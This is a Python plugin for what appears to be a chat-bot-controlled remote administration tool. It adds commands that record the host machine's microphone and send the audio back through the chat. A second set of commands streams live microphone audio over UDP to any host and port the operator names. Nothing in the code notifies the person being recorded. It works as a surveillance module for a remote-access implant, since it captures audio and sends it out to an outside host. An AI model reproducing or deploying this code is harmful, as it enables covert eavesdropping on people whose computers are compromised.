from plugins import Plugin, Command

from threading import Thread

import os
import pyaudio
import wave
import socket

class Main(Plugin):

    name = 'Microphone'
    version = '1.0.0'
    
    def setup(self):
        self.stop = False
        self.frames = []

        c = Command('/mic_record', usage='HOSTNAME /mic_record <seconds> - record <seconds> seconds of audio from microphone')
        self.add_command(c)
        
        c = Command('/mic_stream', usage='HOSTNAME /mic_stream <host> <port> - stream microphone to remote host')
        self.add_command(c)

        c = Command('/mic_stream_stop', usage='HOSTNAME /mic_stream_stop - stop microphone streaming')
        self.add_command(c)

    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/mic_record':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_mic_record, args=tuple(arg_list))
            t.start()
        elif command == '/mic_stream':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_mic_stream, args=tuple(arg_list))
            t.start()
        elif command == '/mic_stream_stop':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_mic_stream_stop)
            t.start()

    def handle_mic_stream_stop(self):
        self.stop = True

    def udpStream(self, host, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        while not self.stop:
            if len(self.frames) > 0:
                s.sendto(self.frames.pop(0), (host, int(port)))

        s.close()

    def record(self, chat_id, stream, CHUNK):
        while not self.stop:
            self.frames.append(stream.read(CHUNK))

        self.bot.send_message(chat_id, 'Microphone Stream stopped')

    def handle_mic_stream(self, chat_id, host, port):
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        CHUNK = 1024

        self.stop = False

        try:
            audio = pyaudio.PyAudio()
            stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)

            self.bot.send_message(chat_id, 'Microphone Streaming started, sending data to server {}:{}'.format(host, port))

            Tr = Thread(target=self.record, args=(chat_id, stream, CHUNK,))
            Ts = Thread(target=self.udpStream, args=(host, port,))
            Tr.setDaemon(True)
            Ts.setDaemon(True)
            Tr.start()
            Ts.start()

            return
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))

    def handle_mic_record(self, chat_id, seconds):
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        CHUNK = 1024
        RECORD_SECONDS = int(seconds)

        WAVE_OUTPUT_FILENAME = self.bot.get_tmp(self.bot.generate_file_name('microphone_recording.wav'))

        try:
            audio = pyaudio.PyAudio()
            stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
            self.bot.send_message(chat_id, 'Recording...')
            frames = []

            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)
            # stop Recording
            stream.stop_stream()
            stream.close()
            audio.terminate()
            self.bot.send_message(chat_id, 'Finished recording!')

            waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
            waveFile.setnchannels(CHANNELS)
            waveFile.setsampwidth(audio.get_sample_size(FORMAT))
            waveFile.setframerate(RATE)
            waveFile.writeframes(b''.join(frames))
            waveFile.close()

            f = open(WAVE_OUTPUT_FILENAME, 'rb')
            self.bot.bot.sendAudio(chat_id, f)
            f.close()
            os.remove(WAVE_OUTPUT_FILENAME)
            return
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))
